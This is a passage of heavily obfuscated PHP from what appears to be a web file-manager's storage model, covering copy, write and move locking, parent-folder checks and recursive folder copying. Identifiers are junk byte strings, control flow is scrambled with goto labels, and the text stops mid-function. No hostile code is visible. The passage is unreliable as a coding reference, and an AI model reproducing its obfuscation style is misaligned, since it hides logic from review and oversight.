$Cº®‚à“„› =& $_SERVER[Ö‘Øù]; if (!$this->allowLock()) { return; } $this->_lockCheck($Cº®‚à“„›[544], $FÆõõ©‰Ô); goto F¥’¥ÄèÇÁ; F¥’¥ÄèÇÁ: $e¨‡°²Ô±– = 1; $this->_lockEvent($FÆõõ©‰Ô, array($Cº®‚à“„›[545], $Cº®‚à“„›[546]), $e¨‡°²Ô±–); $this->_lockParent($FÆõõ©‰Ô, array($Cº®‚à“„›[546]), $e¨‡°²Ô±–); goto FòÂºÁ³; cœèŒˆ°ì: } public function lockCopyEnd($eÂŸÄâ¤¬¡) { $d…ò®”÷‰„ =& $_SERVER[Ö‘Øù]; if (!$this->allowLock()) { return; } $b‡ÖÀ£Œ”§ = 0; $this->_lockEvent($eÂŸÄâ¤¬¡, array($d…ò®”÷‰„[545], $d…ò®”÷‰„[546]), $b‡ÖÀ£Œ”§); $this->_lockParent($eÂŸÄâ¤¬¡, array($d…ò®”÷‰„[546]), $b‡ÖÀ£Œ”§); $this->_lockEvent($eÂŸÄâ¤¬¡, array($d…ò®”÷‰„[547], $d…ò®”÷‰„[548]), $b‡ÖÀ£Œ”§); } public function lockWriteStart($dÍÅ›ƒÈê², $eÜÁÛ®İªÇ = '') { goto bíĞ§¼Òé; E‚öÓÜ…ö•: $this->_lockParent($dÍÅ›ƒÈê², array($e£”’ì—Ê¼[544], $e£”’ì—Ê¼[546]), $d‘è´Ì¥ÀŒ); $this->_lockCheckEnd($e£”’ì—Ê¼[545], $dÍÅ›ƒÈê²); goto d‡§Ò¥ß“¥; e¡ŞŠ›ÈŒœ: $d‘è´Ì¥ÀŒ = 1; $this->_lockKey($e£”’ì—Ê¼[549] . $dÍÅ›ƒÈê² . $e£”’ì—Ê¼[95] . $eÜÁÛ®İªÇ, $d‘è´Ì¥ÀŒ); $this->_lockEvent($dÍÅ›ƒÈê², array($e£”’ì—Ê¼[544], $e£”’ì—Ê¼[546]), $d‘è´Ì¥ÀŒ); goto E‚öÓÜ…ö•; bíĞ§¼Òé: $e£”’ì—Ê¼ =& $_SERVER[Ö‘Øù]; if (!$this->allowLock()) { return; } $this->_lockCheck($e£”’ì—Ê¼[545], $dÍÅ›ƒÈê²); goto e¡ŞŠ›ÈŒœ; d‡§Ò¥ß“¥: } public function lockWriteEnd($E´ó†Ï°ì›, $D§ëëã½£Ÿ = '') { $e’“·Åïá„ =& $_SERVER[Ö‘Øù]; if (!$this->allowLock()) { return; } $EÑµìÈì = 0; $this->_lockKey($e’“·Åïá„[549] . $E´ó†Ï°ì› . $e’“·Åïá„[95] . $D§ëëã½£Ÿ, $EÑµìÈì); $this->_lockEvent($E´ó†Ï°ì›, array($e’“·Åïá„[544], $e’“·Åïá„[546]), $EÑµìÈì); $this->_lockParent($E´ó†Ï°ì›, array($e’“·Åïá„[544], $e’“·Åïá„[546]), $EÑµìÈì); } public function lockMoveStart($E«©†‰Äµ°) { goto f…åáøùââ; f…åáøùââ: $eÚÎ”‹¬¨ =& $_SERVER[Ö‘Øù]; if (!$this->allowLock()) { return; } $this->_lockCheck($eÚÎ”‹¬¨[546], $E«©†‰Äµ°); goto A­ÍÀå‰˜œ; A­ÍÀå‰˜œ: $dÎ¶õ·¿“¢ = 1; $this->_lockKey($eÚÎ”‹¬¨[550] . $E«©†‰Äµ°, $dÎ¶õ·¿“¢); $this->_lockEvent($E«©†‰Äµ°, array($eÚÎ”‹¬¨[544], $eÚÎ”‹¬¨[545]), $dÎ¶õ·¿“¢); goto Aë‰«ñ²²è; Aë‰«ñ²²è: $this->_lockParent($E«©†‰Äµ°, array($eÚÎ”‹¬¨[544], $eÚÎ”‹¬¨[546]), $dÎ¶õ·¿“¢); $this->_lockEvent($E«©†‰Äµ°, array($eÚÎ”‹¬¨[551], $eÚÎ”‹¬¨[547], $eÚÎ”‹¬¨[548]), $dÎ¶õ·¿“¢); $this->_lockCheckEnd($eÚÎ”‹¬¨[546], $E«©†‰Äµ°); goto CÍ’–Ş‘Œ; CÍ’–Ş‘Œ: } public function lockMoveEnd($EÚë÷ïÛî) { goto Dì‰›¸¥š; FĞÌ‹î ÈØ: $this->_lockKey($BÖĞ„†Ù•Ï[550] . $EÚë÷ïÛî, $d¿ÅÌÌ˜Â); $this->_lockEvent($EÚë÷ïÛî, array($BÖĞ„†Ù•Ï[544], $BÖĞ„†Ù•Ï[545]), $d¿ÅÌÌ˜Â); $this->_lockParent($EÚë÷ïÛî, array($BÖĞ„†Ù•Ï[544], $BÖĞ„†Ù•Ï[546]), $d¿ÅÌÌ˜Â); goto bÍ¤ïÅÕó; bÍ¤ïÅÕó: $this->_lockEvent($EÚë÷ïÛî, array($BÖĞ„†Ù•Ï[551], $BÖĞ„†Ù•Ï[547], $BÖĞ„†Ù•Ï[548]), $d¿ÅÌÌ˜Â); goto aÚÌÎ½²È; Dì‰›¸¥š: $BÖĞ„†Ù•Ï =& $_SERVER[Ö‘Øù]; if (!$this->allowLock()) { return; } $d¿ÅÌÌ˜Â = 0; goto FĞÌ‹î ÈØ; aÚÌÎ½²È: } private function _lockCheck($A”¯¸øÈğ, $AÎäó»¼¬—) { goto C°¬£Şƒ…‡; Cš—äØî‘Ú: $f™“èÂ¬ëã = array_reverse($this->parentLevelArray($e³ ‚ºƒÛÎ[$D­ô³¬‚Ø“[516]])); foreach ($f™“èÂ¬ëã as $eµƒªæÍÖ) { $c”Ä«íò = $A”¯¸øÈğ . $D­ô³¬‚Ø“[553] . $eµƒªæÍÖ; if (CacheLock::lockGet($D­ô³¬‚Ø“[554] . $c”Ä«íò)) { $e³ ‚ºƒÛÎ = $this->sourceInfo($eµƒªæÍÖ); CacheLock::setErrorMsg($D­ô³¬‚Ø“[160] . htmlspecialchars($e³ ‚ºƒÛÎ[$D­ô³¬‚Ø“[28]]) . $D­ô³¬‚Ø“[531] . $C§ÅŠ¥ì£); $this->_lockKey($c”Ä«íò, 1); $this->_lockKey($c”Ä«íò, 0); } } goto cÛ–Şˆ›÷; C°¬£Şƒ…‡: $D­ô³¬‚Ø“ =& $_SERVER[Ö‘Øù]; $e³ ‚ºƒÛÎ = $this->sourceInfo($AÎäó»¼¬—); $c”Ä«íò = $A”¯¸øÈğ . $D­ô³¬‚Ø“[95] . $AÎäó»¼¬—; goto f¹Ş¥â; f‚¼œŒ¿Ö¹: CacheLock::setErrorMsg($D­ô³¬‚Ø“[160] . htmlspecialchars($e³ ‚ºƒÛÎ[$D­ô³¬‚Ø“[28]]) . $D­ô³¬‚Ø“[531] . $C§ÅŠ¥ì£); $this->_lockKey($c”Ä«íò, 1); $this->_lockKey($c”Ä«íò, 0); goto Cš—äØî‘Ú; f¹Ş¥â: $this->_lockTimeStart[$c”Ä«íò] = timeFloat(); if (!is_array($e³ ‚ºƒÛÎ)) { return; } $C§ÅŠ¥ì£ = LNG($D­ô³¬‚Ø“[552]); goto f‚¼œŒ¿Ö¹; cÛ–Şˆ›÷: } private function _lockCheckEnd($c›ö¾ˆ‰‚—, $D”Ì‹ôñÂ) { goto fáïá™Ó¸Ä; CãšË¨£ñ: if (!isset($this->_lockTimeStart[$FÃã–â– î])) { return; } $FóÍÙ‘‹‘µ = timeFloat() - $this->_lockTimeStart[$FÃã–â– î]; unset($this->_lockTimeStart[$FÃã–â– î]); goto F‹·£³î¤›; fáïá™Ó¸Ä: $b›¦Ü¾Ş¥† =& $_SERVER[Ö‘Øù]; $FÃã–â– î = $c›ö¾ˆ‰‚— . $b›¦Ü¾Ş¥†[95] . $D”Ì‹ôñÂ; CacheLock::setErrorMsg($b›¦Ü¾Ş¥†[376]); goto CãšË¨£ñ; F‹·£³î¤›: if ($FóÍÙ‘‹‘µ > 0.5) { unset(self::$cacheSourceInfo[$b›¦Ü¾Ş¥†[453] . $D”Ì‹ôñÂ]); } $e…¥ÒÎÆ½ = $this->sourceInfo($D”Ì‹ôñÂ); if (!$e…¥ÒÎÆ½) { show_json(LNG($b›¦Ü¾Ş¥†[105]), !1); } goto D×İŠ²ùÎ; D×İŠ²ùÎ: } private function _lockParent($D³À‰—ôÒÎ, $e´Ç¹»Â, $dˆ¾‚†Ëİ) { if (!$this->autoLockSet) { return; } $B»äºàº»¢ = $this->sourceInfo($D³À‰—ôÒÎ); if (!is_array($B»äºàº»¢)) { return; } $DÜ‚æÕ±šç = array_reverse($this->parentLevelArray($B»äºàº»¢[$_SERVER[Ö‘Øù][516]])); foreach ($DÜ‚æÕ±šç as $e—ÅŒ»ˆ½¡) { $this->_lockEvent($e—ÅŒ»ˆ½¡, $e´Ç¹»Â, $dˆ¾‚†Ëİ); } } private function _lockEvent($b‡ñÙëá Ü, $bá×Œ¹©Äò, $CÂìŠ‰¿”Ù) { $DŠ¸îÊ‰Àˆ =& $_SERVER[Ö‘Øù]; if (!$this->autoLockSet) { return; } foreach ($bá×Œ¹©Äò as $EÀ››ÉÏ¯²) { $b«ñšèŞ = $EÀ››ÉÏ¯² . $DŠ¸îÊ‰Àˆ[95] . $b‡ñÙëá Ü; if ($CÂìŠ‰¿”Ù && CacheLock::lockGet($DŠ¸îÊ‰Àˆ[554] . $b«ñšèŞ)) { continue; } $this->_lockKey($b«ñšèŞ, $CÂìŠ‰¿”Ù); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($dÚ¾ìˆØ‹¡, $E¶È‘…¨ëî = 1) { $DÍˆóö»«¤ = $_SERVER[Ö‘Øù][554] . md5($dÚ¾ìˆØ‹¡); if ($E¶È‘…¨ëî) { if (isset(self::$_lockItemArr[$DÍˆóö»«¤])) { return; } self::$_lockItemArr[$DÍˆóö»«¤] = 1; CacheLock::lock($DÍˆóö»«¤, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$DÍˆóö»«¤])) { return; } unset(self::$_lockItemArr[$DÍˆóö»«¤]); CacheLock::unlock($DÍˆóö»«¤); } } public function isParentOf($a°¿¹ª©£—, $féé‰¸˜¦¨) { goto B›„ó„; B‘Ï×Ç×á•: return $aí˜İÍÆ°; goto D¿±“·—«Ö; F®ë÷¼‡¥ñ: $EÙ¸ëÒáÄˆ = $cÀØ÷•†Â[$cÖêÊÄÏš[516]] . $cÀØ÷•†Â[$cÖêÊÄÏš[397]] . $cÖêÊÄÏš[47]; $CËÓ…«ñ¢  = $c¾˜Ø°Íƒô[$cÖêÊÄÏš[516]] . $c¾˜Ø°Íƒô[$cÖêÊÄÏš[397]] . $cÖêÊÄÏš[47]; $aí˜İÍÆ° = strpos($CËÓ…«ñ¢ , $EÙ¸ëÒáÄˆ) === 0; goto B‘Ï×Ç×á•; B›„ó„: $cÖêÊÄÏš =& $_SERVER[Ö‘Øù]; $cÀØ÷•†Â = $this->sourceInfo($a°¿¹ª©£—); $c¾˜Ø°Íƒô = $this->sourceInfo($féé‰¸˜¦¨); goto F®ë÷¼‡¥ñ; D¿±“·—«Ö: } private $targetIsDelete = 0; public function copy($B¶ Ë±á¡, $E‡À ½›ßÌ, $D“¦¢àÙ¡– = REPEAT_REPLACE, $AÎƒ°æŸ¨» = '') { goto AŒÚ­µÛÖÎ; AŒÚ­µÛÖÎ: $Dôê½ÚÛ™ =& $_SERVER[Ö‘Øù]; $D¥¨­ÛÓ„ = $this->sourceInfo($B¶ Ë±á¡); $aŠ£—Š‡Ş÷ = $this->sourceInfo($E‡À ½›ßÌ); goto bã­§…‡•; d¼ØŠ´³»Ì: $this->saveAll($c¥¿¤µª»¬[$Dôê½ÚÛ™[557]]); Model($Dôê½ÚÛ™[193])->linkAdd($c¥¿¤µª»¬[$Dôê½ÚÛ™[555]]); $this->folderSizeReset($E‡À ½›ßÌ); goto a¸°³¨Öé; d¿¬†Š£¿è: $this->targetIsDelete = intval($D¥¨­ÛÓ„[$Dôê½ÚÛ™[425]]); $Dê‹ÄÎ‚Äá = $this->fileNameExistCache($E‡À ½›ßÌ, $D¥¨­ÛÓ„[$Dôê½ÚÛ™[28]]); $aªäÈ™‹éº = $this->_copy($B¶ Ë±á¡, $E‡À ½›ßÌ, $D“¦¢àÙ¡–, $c¥¿¤µª»¬, !0, $AÎƒ°æŸ¨»); goto f©À•¤‰è‚; Eê«Ì¢Ó¢: if ($D¥¨­ÛÓ„[$Dôê½ÚÛ™[405]] == $Dôê½ÚÛ™[87] && $Dê‹ÄÎ‚Äá == $aªäÈ™‹éº) { $this->folderSizeResetChildren($Dê‹ÄÎ‚Äá); } Model($Dôê½ÚÛ™[558])->addAll($c¥¿¤µª»¬[$Dôê½ÚÛ™[556]], array(), !0); if ($Dê‹ÄÎ‚Äá != $aªäÈ™‹éº || $D¥¨­ÛÓ„[$Dôê½ÚÛ™[405]] == $Dôê½ÚÛ™[87]) { Model($Dôê½ÚÛ™[559])->eventCopy($aªäÈ™‹éº); } goto d¼ØŠ´³»Ì; f©À•¤‰è‚: $this->_childrenListClear(); $this->lockCopyEnd($B¶ Ë±á¡); $this->lockWriteEnd($E‡À ½›ßÌ, $D›º¼èœŠã); goto Eê«Ì¢Ó¢; fÏÉ£‘½™â: $this->lockCopyStart($B¶ Ë±á¡); $this->lockWriteStart($E‡À ½›ßÌ, $D›º¼èœŠã); $c¥¿¤µª»¬ = array($Dôê½ÚÛ™[555] => array(), $Dôê½ÚÛ™[556] => array(), $Dôê½ÚÛ™[557] => array()); goto d¿¬†Š£¿è; a¸°³¨Öé: $this->updateModifyTime($E‡À ½›ßÌ); return $aªäÈ™‹éº; goto EÕù÷½¶¬; bã­§…‡•: if (!$D¥¨­ÛÓ„ || !$aŠ£—Š‡Ş÷ || $aŠ£—Š‡Ş÷[$Dôê½ÚÛ™[405]] != $Dôê½ÚÛ™[87]) { return !1; } if ($this->isParentOf($B¶ Ë±á¡, $E‡À ½›ßÌ)) { return !1; } $D›º¼èœŠã = $AÎƒ°æŸ¨» ? $AÎƒ°æŸ¨» : $D¥¨­ÛÓ„[$Dôê½ÚÛ™[28]]; goto fÏÉ£‘½™â; EÕù÷½¶¬: } private function _copy($d…¾ˆä¤¦è, $Då¯ùÔ•ÁÅ, $c•Û³Òªê†, &$AŞÈŠÜ×¡©, $E¿æœ‰‹ò¿, $e„öİ¹ËÍ = '') { goto a¥…æ ğà; b°…–¡³Æ: $FĞ§İ¦À¥ª = $e„öİ¹ËÍ ? $e„öİ¹ËÍ : $a¦Ìê¹„Ø[$E¿ŠƒïŒçÈ[28]]; $eªÓ…õªï† = $this->fileNameExistCache($Då¯ùÔ•ÁÅ, $FĞ§İ¦À¥ª); if ($E¿æœ‰‹ò¿) { $this->_childrenAllMake($d…¾ˆä¤¦è); if ($d—öñ“”– && $eªÓ…õªï†) { $this->_childrenAllMake($eªÓ…õªï†); } } goto Fà‘á«²Ãƒ; Fà‘á«²Ãƒ: if (!$eªÓ…õªï†) { return $this->_copyCreate($d…¾ˆä¤¦è, $Då¯ùÔ•ÁÅ, $FĞ§İ¦À¥ª, $AŞÈŠÜ×¡©); } $D›šÔ¡¸ƒÕ = $eªÓ…õªï†; if ($d—öñ“”–) { if ($c•Û³Òªê† == REPEAT_RENAME_FOLDER) { $FĞ§İ¦À¥ª = $this->fileNameAutoCache($Då¯ùÔ•ÁÅ, $FĞ§İ¦À¥ª, $c•Û³Òªê†, $d—öñ“”–); $D›šÔ¡¸ƒÕ = $this->_copyCreate($d…¾ˆä¤¦è, $Då¯ùÔ•ÁÅ, $FĞ§İ¦À¥ª, $AŞÈŠÜ×¡©); } else { $fíóİòºŞ = $this->_childrenList($d…¾ˆä¤¦è); foreach ($fíóİòºŞ as $b£—ŠŒ“¢š) { $this->_copy($b£—ŠŒ“¢š[$E¿ŠƒïŒçÈ[397]], $eªÓ…õªï†, $c•Û³Òªê†, $AŞÈŠÜ×¡©, !1); } } } else { if ($c•Û³Òªê† == REPEAT_RENAME || $c•Û³Òªê† == REPEAT_RENAME_FOLDER) { $FĞ§İ¦À¥ª = $this->fileNameAutoCache($Då¯ùÔ•ÁÅ, $FĞ§İ¦À¥ª, $c•Û³Òªê†, $d—öñ“”–); $D›šÔ¡¸ƒÕ = $this->_copyCreate($d…¾ˆä¤¦è, $Då¯ùÔ•ÁÅ, $FĞ§İ¦À¥ª, $AŞÈŠÜ×¡©); } else { if ($c•Û³Òªê† == REPEAT_REPLACE) { $c¢Û …¦ï¸ = $this->sourceInfoCache($eªÓ…õªï†); $cĞØìæ–® = $this->fileHistory($c¢Û …¦ï¸, $a¦Ìê¹„Ø[$E¿ŠƒïŒçÈ[462]], $a¦Ìê¹„Ø[$E¿ŠƒïŒçÈ[78]]); if ($cĞØìæ–®) { $AŞÈŠÜ×¡©[$E¿ŠƒïŒçÈ[555]][] = $a¦Ìê¹„Ø[$E¿ŠƒïŒçÈ[462]]; } } else { if ($c•Û³Òªê† == REPEAT_SKIP) { } } } Hook::trigger($E¿ŠƒïŒçÈ[560], array($E¿ŠƒïŒçÈ[561], $a¦Ìê¹„Ø, 0)); } goto c×Ø¾˜İ¨; c×Ø¾˜İ¨: return $D›šÔ¡¸ƒÕ; goto b¶Ëè½Õë¦; a¥…æ ğà: $E¿ŠƒïŒçÈ =& $_SERVER[Ö‘Øù]; $a¦Ìê¹„Ø = $this->sourceInfoCache($d…¾ˆä¤¦è); $d—öñ“”– = $a¦Ìê¹„Ø[$E¿ŠƒïŒçÈ[405]] == $E¿ŠƒïŒçÈ[87]; goto b°…–¡³Æ; b¶Ëè½Õë¦: } private function _copyCreate($fòé‹ïÀ, $bö±½Š®Î, $f÷µòÃÓñà, &$AÙ ‘Ü¯„) { goto EôîÏÕƒÑ¸; Fì»ÒŞ¤Ï: foreach ($d²å¡Ë§° as $C‡ßÖ›©çØ) { $E ¾—ƒØíÚ = $C‡ßÖ›©çØ[$B†‰‘ÇÜƒ¹[397]]; $E¦ëØå« = $this->_childrenMatch($Eò‰“Ë“Ú¬, $C‡ßÖ›©çØ, $eñõµ§®³); $b¢ÉŸÕ…«[] = array($B†‰‘ÇÜƒ¹[397], $E ¾—ƒØíÚ, $B†‰‘ÇÜƒ¹[493], $E¦ëØå«[$B†‰‘ÇÜƒ¹[493]]); $BÈ•…öô‡ç[] = array($B†‰‘ÇÜƒ¹[397], $E ¾—ƒØíÚ, $B†‰‘ÇÜƒ¹[516], $E¦ëØå«[$B†‰‘ÇÜƒ¹[516]]); $this->_copyApplyMeta($C‡ßÖ›©çØ, $AÙ ‘Ü¯„); if ($C‡ßÖ›©çØ[$B†‰‘ÇÜƒ¹[405]] != $B†‰‘ÇÜƒ¹[87]) { $AÙ ‘Ü¯„[$B†‰‘ÇÜƒ¹[555]][] = $C‡ßÖ›©çØ[$B†‰‘ÇÜƒ¹[462]]; } } $this->chunkEventSet($B†‰‘ÇÜƒ¹[567], array($B†‰‘ÇÜƒ¹[568], $a…ŒÏÁÀæ¸, $AÙ—„ã‡¯)); $this->saveAll($b¢ÉŸÕ…«); goto a‡Ş§äÍíö; a‡Ş§äÍíö: $this->chunkEventSet($B†‰‘ÇÜƒ¹[569], array($B†‰‘ÇÜƒ¹[570], $a…ŒÏÁÀæ¸, $AÙ—„ã‡¯)); $this->saveAll($BÈ•…öô‡ç); return $Dˆà™É¾õõ; goto B†Õ‹ô’‚ˆ; b‚Ğ©¿Çğ‰: $eñõµ§®³ = $this->sourceInfo($Dˆà™É¾õõ); foreach ($a´£ğˆÌ¸ä as $C‡ßÖ›©çØ) { $d–¸Â§œÑì = $this->_makeItemData($C‡ßÖ›©çØ, $eñõµ§®³, $C‡ßÖ›©çØ[$B†‰‘ÇÜƒ¹[28]]); $d–¸Â§œÑì[$B†‰‘ÇÜƒ¹[516]] = $C‡ßÖ›©çØ[$B†‰‘ÇÜƒ¹[516]]; $Aæ»ÇÌòÑå[] = $d–¸Â§œÑì; } $this->chunkEventSet($B†‰‘ÇÜƒ¹[565], array($B†‰‘ÇÜƒ¹[566], $a…ŒÏÁÀæ¸, $AÙ—„ã‡¯)); goto e¦ŒôğÖÍä; F©Û†á¶‚: $Eò‰“Ë“Ú¬[$fòé‹ïÀ] = $Dˆà™É¾õõ; $b¢ÉŸÕ…« = array(); $BÈ•…öô‡ç = array(); goto Fì»ÒŞ¤Ï; eö‘¿í°¹»: $this->_childrenListAll($fòé‹ïÀ, $a´£ğˆÌ¸ä); $AÙ—„ã‡¯ = count($a´£ğˆÌ¸ä); if ($AÙ—„ã‡¯ == 0) { return $Dˆà™É¾õõ; } goto b‚Ğ©¿Çğ‰; aÎ©›“µ¯ß: $Dˆà™É¾õõ = $this->add($a…ŒÏÁÀæ¸); $f‡‰ôçò°ø = array($B†‰‘ÇÜƒ¹[397] => $Dˆà™É¾õõ, $B†‰‘ÇÜƒ¹[28] => $f÷µòÃÓñà); $this->_copyApplyMeta($f‡‰ôçò°ø, $AÙ ‘Ü¯„); goto F£›•–˜ì„; e¦ŒôğÖÍä: $this->addAll($Aæ»ÇÌòÑå, array(), !1); $d²å¡Ë§° = $this->where(array($B†‰‘ÇÜƒ¹[493] => $Dˆà™É¾õõ))->select(); $Eò‰“Ë“Ú¬ = $this->_childrenMakeRelation($a´£ğˆÌ¸ä, $d²å¡Ë§°); goto F©Û†á¶‚; EôîÏÕƒÑ¸: $B†‰‘ÇÜƒ¹ =& $_SERVER[Ö‘Øù]; $dŞÃŠâ† = $this->sourceInfoCache($fòé‹ïÀ); $C”‘ß²³´ = $this->sourceInfoCache($bö±½Š®Î); goto CÕÓùåÏ…; F£›•–˜ì„: if ($dŞÃŠâ†[$B†‰‘ÇÜƒ¹[405]] != $B†‰‘ÇÜƒ¹[87]) { $AÙ ‘Ü¯„[$B†‰‘ÇÜƒ¹[555]][] = $dŞÃŠâ†[$B†‰‘ÇÜƒ¹[462]]; return $Dˆà™É¾õõ; } $a´£ğˆÌ¸ä = array(); $Aæ»ÇÌòÑå = array(); goto eö‘¿í°¹»; CÕÓùåÏ…: $a…ŒÏÁÀæ¸ = $this->_makeItemData($dŞÃŠâ†, $C”‘ß²³´, $f÷µòÃÓñà); Hook::trigger($B†‰‘ÇÜƒ¹[562], $a…ŒÏÁÀæ¸); Hook::trigger($B†‰‘ÇÜƒ¹[563], array($B†‰‘ÇÜƒ¹[564], $a…ŒÏÁÀæ¸, 0)); goto aÎ©›“µ¯ß; B†Õ‹ô’‚ˆ: } private function _childrenMakeRelation($d¿öÖ·ó‚, $bĞÛï´Œä®) { $f®óÙƒ½¶¨ =& $_SERVER[Ö‘Øù]; $eº™‚—İÁ = array(); $fÎ­Îçí÷ = array(); foreach ($d¿öÖ·ó‚ as $b­©ÄÌ¬Å) { $BŠ‘§ìÙâ = $b­©ÄÌ¬Å[$f®óÙƒ½¶¨[28]] . $f®óÙƒ½¶¨[8] . $b­©ÄÌ¬Å[$f®óÙƒ½¶¨[516]]; $eº™‚—İÁ[$BŠ‘§ìÙâ] = $b­©ÄÌ¬Å[$f®óÙƒ½¶¨[397]]; } foreach ($bĞÛï´Œä® as $b­©ÄÌ¬Å) { $BŠ‘§ìÙâ = $b­©ÄÌ¬Å[$f®óÙƒ½¶¨[28]] . $f®óÙƒ½¶¨[8] . $b­©ÄÌ¬Å[$f®óÙƒ½¶¨[516]]; $Eœ­¸ÀÛ = $eº™‚—İÁ[$BŠ‘§ìÙâ]; $fÎ­Îçí÷[$Eœ­¸ÀÛ] = $b­©ÄÌ¬Å[$f®óÙƒ½¶¨[397]]; } return $fÎ­Îçí÷; } private function _childrenMatch($f÷ƒ„ƒœš, $dáŒ¶î±¿Õ, $BÚ›ôÂ‘©Ö) { goto A‡ô­ƒ¼Ê…; Cïà‡ ÚŞß: foreach ($eéâ“µ³¥¢ as $EÙ‹—¤£®) { if (isset($f÷ƒ„ƒœš[$EÙ‹—¤£®])) { $b¿ªÑªÆ—Ê .= $f÷ƒ„ƒœš[$EÙ‹—¤£®] . $B±¦‹ÄØØğ[571]; } } $b¿ªÑªÆ—Ê = rtrim($b¿ªÑªÆ—Ê, $B±¦‹ÄØØğ[47]) . $B±¦‹ÄØØğ[47]; $d¯øèàõ¨¦ = $this->parentLevelArray($b¿ªÑªÆ—Ê); goto f±éç„‹Ö; f±éç„‹Ö: $d‘Åå¦Ë²³ = $d¯øèàõ¨¦[count($d¯øèàõ¨¦) - 1]; return array($B±¦‹ÄØØğ[493] => $d‘Åå¦Ë²³, $B±¦‹ÄØØğ[516] => $b¿ªÑªÆ—Ê); goto cøô‹ì´¢¡; A‡ô­ƒ¼Ê…: $B±¦‹ÄØØğ =& $_SERVER[Ö‘Øù]; $b¿ªÑªÆ—Ê = $BÚ›ôÂ‘©Ö[$B±¦‹ÄØØğ[516]]; $eéâ“µ³¥¢ = $this->parentLevelArray($dáŒ¶î±¿Õ[$B±¦‹ÄØØğ[516]]); goto Cïà‡ ÚŞß; cøô‹ì´¢¡: } private function _makeItemData($FÑ•™¿ÆôŸ, $Fª¾ØíšÆ‹, $A‡Ş—ç‚ôë) { $eĞ°ñÅª‡ª =& $_SERVER[Ö‘Øù]; $CÃ«êç¦µæ = array($eĞ°ñÅª‡ª[572] => $FÑ•™¿ÆôŸ[$eĞ°ñÅª‡ª[405]], $eĞ°ñÅª‡ª[415] => $A‡Ş—ç‚ôë, $eĞ°ñÅª‡ª[573] => $FÑ•™¿ÆôŸ[$eĞ°ñÅª‡ª[407]], $eĞ°ñÅª‡ª[463] => $FÑ•™¿ÆôŸ[$eĞ°ñÅª‡ª[462]], $eĞ°ñÅª‡ª[574] => $FÑ•™¿ÆôŸ[$eĞ°ñÅª‡ª[78]], $eĞ°ñÅª‡ª[575] => $Fª¾ØíšÆ‹[$eĞ°ñÅª‡ª[406]], $eĞ°ñÅª‡ª[576] => $Fª¾ØíšÆ‹[$eĞ°ñÅª‡ª[499]], $eĞ°ñÅª‡ª[577] => USER_ID, $eĞ°ñÅª‡ª[578] => USER_ID, $eĞ°ñÅª‡ª[396] => $Fª¾ØíšÆ‹[$eĞ°ñÅª‡ª[397]], $eĞ°ñÅª‡ª[579] => $Fª¾ØíšÆ‹[$eĞ°ñÅª‡ª[516]] . $Fª¾ØíšÆ‹[$eĞ°ñÅª‡ª[397]] . $eĞ°ñÅª‡ª[47], $eĞ°ñÅª‡ª[419] => $FÑ•™¿ÆôŸ[$eĞ°ñÅª‡ª[84]], $eĞ°ñÅª‡ª[424] => 0, $eĞ°ñÅª‡ª[580] => $eĞ°ñÅª‡ª[33]); return $CÃ«êç¦µæ; } private function _copyApplyMeta($eàÖ‰ù¬ ’, &$C½¥ƒÄ¢°Ù) { $EÉĞ“—ø‚™ =& $_SERVER[Ö‘Øù]; $C‘îÚ¦”Æ = $eàÖ‰ù¬ ’[$EÉĞ“—ø‚™[397]]; $fÒëæÑİ¸Â = $eàÖ‰ù¬ ’[$EÉĞ“—ø‚™[28]]; if (!isset($eàÖ‰ù¬ ’[$EÉĞ“—ø‚™[581]]) || !$eàÖ‰ù¬ ’[$EÉĞ“—ø‚™[581]] || $eàÖ‰ù¬ ’[$EÉĞ“—ø‚™[581]] == $EÉĞ“—ø‚™[191]) { $C½¥ƒÄ¢°Ù[$EÉĞ“—ø‚™[557]][] = array($EÉĞ“—ø‚™[397], $C‘îÚ¦”Æ, $EÉĞ“—ø‚™[581], short_id($C‘îÚ¦”Æ)); } if (Input::check($fÒëæÑİ¸Â, $EÉĞ“—ø‚™[582])) { $C½¥ƒÄ¢°Ù[$EÉĞ“—ø‚™[556]][] = array($EÉĞ“—ø‚™[397] => $C‘îÚ¦”Æ, $EÉĞ“—ø‚™[93] => $EÉĞ“—ø‚™[459], $EÉĞ“—ø‚™[372] => str_replace($EÉĞ“—ø‚™[50], $EÉĞ“—ø‚™[33], Pinyin::get($fÒëæÑİ¸Â))); $C½¥ƒÄ¢°Ù[$EÉĞ“—ø‚™[556]][] = array($EÉĞ“—ø‚™[397] => $C‘îÚ¦”Æ, $EÉĞ“—ø‚™[93] => $EÉĞ“—ø‚™[458], $EÉĞ“—ø‚™[372] => Pinyin::get($fÒëæÑİ¸Â, $EÉĞ“—ø‚™[583])); } $C½¥ƒÄ¢°Ù[$EÉĞ“—ø‚™[556]][] = array($EÉĞ“—ø‚™[397] => $C‘îÚ¦”Æ, $EÉĞ“—ø‚™[93] => $EÉĞ“—ø‚™[437], $EÉĞ“—ø‚™[372] => KodSort::makeStr($fÒëæÑİ¸Â)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($d¯›Ê–Ãíœ) { goto D•áãÄŸªÃ; Aç·Õ»è·á: $cÑå§”ÂùÚ = array($aºŒªª’”[516] => array($aºŒªª’”[539], $C÷¶ ƒÅ§ª[$aºŒªª’”[516]] . $d¯›Ê–Ãíœ . $aºŒªª’”[540]), $aºŒªª’”[425] => $this->targetIsDelete); $B¢Š„îŠŒ’ = $this->field($eÃÛ“¦ê¤)->where($cÑå§”ÂùÚ)->select(); if (!$B¢Š„îŠŒ’) { return; } goto DÈÁÊÀÇ³Â; D•áãÄŸªÃ: $aºŒªª’” =& $_SERVER[Ö‘Øù]; $C÷¶ ƒÅ§ª = $this->sourceInfo($d¯›Ê–Ãíœ); $eÃÛ“¦ê¤ = $aºŒªª’”[584]; goto Aç·Õ»è·á; DÈÁÊÀÇ³Â: $B¢Š„îŠŒ’ = array_to_keyvalue($B¢Š„îŠŒ’, $aºŒªª’”[397]); foreach ($B¢Š„îŠŒ’ as $eñİ»òêÍ ) { $c±‡“˜‚é¥ = $eñİ»òêÍ [$aºŒªª’”[493]]; $d¯›Ê–Ãíœ = $eñİ»òêÍ [$aºŒªª’”[397]]; if (!isset($this->_childrenListCache[$d¯›Ê–Ãíœ]) && $eñİ»òêÍ [$aºŒªª’”[405]] == $aºŒªª’”[87]) { $this->_childrenListCache[$d¯›Ê–Ãíœ] = array(); } if (!isset($this->_childrenListCache[$c±‡“˜‚é¥])) { 